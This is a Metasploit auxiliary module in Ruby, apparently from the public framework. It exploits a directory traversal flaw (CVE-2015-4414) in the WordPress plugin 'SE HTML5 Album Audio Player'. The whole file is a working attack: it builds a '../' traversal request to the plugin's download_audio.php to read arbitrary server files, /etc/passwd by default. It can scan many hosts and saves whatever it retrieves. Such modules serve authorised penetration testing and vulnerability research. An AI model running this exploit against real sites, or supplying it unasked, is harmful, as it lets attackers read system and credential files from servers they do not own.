##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress SE HTML5 Album Audio Player File Read Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in WordPress Plugin
        "SE HTML5 Album Audio PLayer", allowing to read arbitrary files with the web server
        privileges.
      },
      'References'     =>
        [
          ['WPVDB', '8032'],
          ['CVE', '2015-4414'],
          ['URL', 'http://www.vapid.dhs.org/advisory.php?v=124']
        ],
      'Author'         =>
        [
          'Larry Cashdollar', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, "The path to the file to read", "/etc/passwd"]),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 6 ])
      ], self.class)
  end

  def check
    check_plugin_version_from_readme('se-html5-album-audio-player')
  end

  def run_host(ip)
    traversal = "../" * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//

    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(wordpress_url_plugins, 'se-html5-album-audio-player', 'download_audio.php'),
      'vars_get' =>
        {
          'file' => "/wp-content/uploads/#{traversal}#{filename}"
        }
    )

    #puts("REQUEST:\n#{res.request}")
    unless res && res.body
      vprint_error("#{peer} - Failed! Unaxpected response from server.")
      return
    end

    if res.code == 200 && res.body.length > 0

      vprint_status('Downloading file...')
      vprint_line("#{res.body}")

      fname = datastore['FILEPATH']

      path = store_loot(
        'se-html5-album',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded. You can try to change the DEPTH parameter.")
    end
  end
end
